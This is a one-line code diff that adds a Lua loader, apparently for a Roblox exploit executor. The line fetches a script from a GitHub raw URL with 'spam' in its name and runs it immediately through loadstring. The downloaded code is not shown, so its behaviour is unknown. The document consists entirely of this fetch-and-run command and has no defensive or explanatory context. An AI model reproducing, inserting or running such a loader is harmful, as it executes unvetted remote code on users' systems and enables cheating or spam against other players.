@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/rainy-valley-spam2-eaei5rxtgx50tc.lua"))()
